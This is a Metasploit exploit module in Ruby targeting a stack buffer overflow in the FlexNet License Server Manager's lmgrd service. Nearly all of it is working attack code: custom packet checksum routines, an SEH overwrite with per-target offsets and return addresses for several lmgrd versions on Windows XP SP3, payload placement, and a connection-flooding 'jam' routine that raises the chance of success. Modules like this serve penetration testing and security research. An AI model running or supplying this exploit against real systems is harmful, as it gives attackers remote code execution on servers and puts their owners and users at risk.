##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'FlexNet License Server Manager lmgrd Buffer Overflow',
			'Description'    => %q{
					This module exploits a vulnerability in the FlexNet
				License Server Manager.

				The vulnerability is due to the insecure usage of memcpy
				in the lmgrd service when handling network packets, which
				results in a stack buffer overflow.

				In order to improve reliability, this module will make lots of
				connections to lmgrd during each attempt to maximize its success.
			},
			'Author'         =>
				[
					'Luigi Auriemma', # Vulnerability Discovery and PoC
					'Alexander Gavrun', # Vulnerability Discovery
					'juan vazquez', # Metasploit module
					'sinn3r' # Metasploit module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'OSVDB', '81899' ],
					[ 'BID', '52718' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-052/' ],
					[ 'URL', 'http://aluigi.altervista.org/adv/lmgrd_1-adv.txt' ]
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process'
				},
			'Payload' =>
				{
					'Space' => 4000
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Debug', {} ],
					[ 'Autodesk Licensing Server Tools 11.5 / lmgrd 11.5.0.0 / Windows XP SP3',
						{
							'Offset' => 10476,
							'ShellcodeOffset' => 5504,
							'Ret' => 0x0047d01f # ppr from lmgrd.exe
						}
					],
					[ 'Alias License Tools 10.8.0.7 / lmgrd 10.8.0.7 / Windows XP SP3',
						{
							'Offset' => 7324,
							'ShellcodeOffset' => 2332,
							'Ret' => 0x004eda91 # ppr from lmgrd.exe
						}
					],
					[ 'Alias License Tools 10.8 / lmgrd 10.8.0.2 / Windows XP SP3',
						{
							'Offset' => 7320,
							'ShellcodeOffset' => 2328,
							'Ret' => 0x004eb2e1 # ppr from lmgrd.exe
						}
					],
				],
			'DefaultTarget'  => 1,
			'DisclosureDate' => 'Mar 23 2012'))

		register_options(
			[
				Opt::RPORT(27000),
				OptInt.new('Attempts', [ true, 'Number of attempts for the exploit phase', 20 ]),
				OptInt.new('Wait', [ true, 'Delay between brute force attempts', 2 ]),
				OptInt.new('Jam', [ true, 'Number of requests to jam the server', 100 ])
			], self.class)
	end

	def header_checksum(packet)
		packet_bytes = packet.unpack("C*")
		checksum = packet_bytes[0]
		i = 2
		while i < 0x14
			checksum = checksum + packet_bytes[i]
			i = i + 1
		end
		return (checksum & 0x0FF)
	end

	def data_checksum(packet_data)
		word_table = ""
		i = 0
		while i < 256
			v4 = 0
			v3 = i
			j = 8

			while j > 0
				if ((v4 ^ v3) & 1) == 1
					v4 = ((v4 >> 1) ^ 0x3A5D) & 0x0FFFF
				else
					v4 = (v4 >> 1) & 0x0FFFF
				end
				v3 >>= 1
				j = j - 1
			end

			word_table << [v4].pack("S")
			i = i + 1
		end
		k = 0
		checksum = 0
		data_bytes = packet_data.unpack("C*")
		word_table_words = word_table.unpack("S*")
		while k < packet_data.length
			position = data_bytes[k] ^ (checksum & 0x0FF)
			checksum = (word_table_words[position] ^ (checksum >> 8)) & 0x0FFFF
			k = k + 1
		end
		return checksum
	end

	def create_packet(data)
		pkt = "\x2f"
		pkt << "\x00" # header checksum
		pkt << "\x00\x00" # data checksum
		pkt << "\x00\x00" # pkt length
		pkt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		pkt << data

		pkt[4,2] = [pkt.length].pack("n")

		data_sum = data_checksum(pkt[4, pkt.length - 4])
		pkt[2, 2] = [data_sum].pack("n")

		hdr_sum = header_checksum(pkt[0, 20])
		pkt[1] = [hdr_sum].pack("C")

		return pkt
	end

	def jam
		pkt = create_packet("")

		datastore['Jam'].times do
			connect
			sock.put(pkt)
			disconnect
		end
	end

	def exploit
		i = 1
		while i <= datastore['Attempts'] and not session_created?
			print_status("Attempt #{i}/#{datastore['Attempts']} to exploit...")
			do_exploit
			sleep(datastore['Wait'])
			i = i + 1
		end

		if not session_created?
			print_error("Exploit didn't work after #{i} attempts")
		end
	end

	def do_exploit
		t = framework.threads.spawn("jam", false) { jam }
		my_payload = payload.encoded

		header_length = 20 # See create_packet() to understand this number
		pkt_data = ""
		if target.name =~ /Debug/
			pkt_data << "a" * (65535 - header_length)
		else
			pkt_data << "a" * target['ShellcodeOffset']
			pkt_data << my_payload
			pkt_data << rand_text(target['Offset']-target['ShellcodeOffset']-my_payload.length)
			pkt_data << generate_seh_record(target.ret)
			pkt_data << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-5000").encode_string
			pkt_data << rand_text(65535 - pkt_data.length - header_length)
		end

		pkt = create_packet(pkt_data)

		connect
		sock.put(pkt)
		handler
		disconnect
	end

end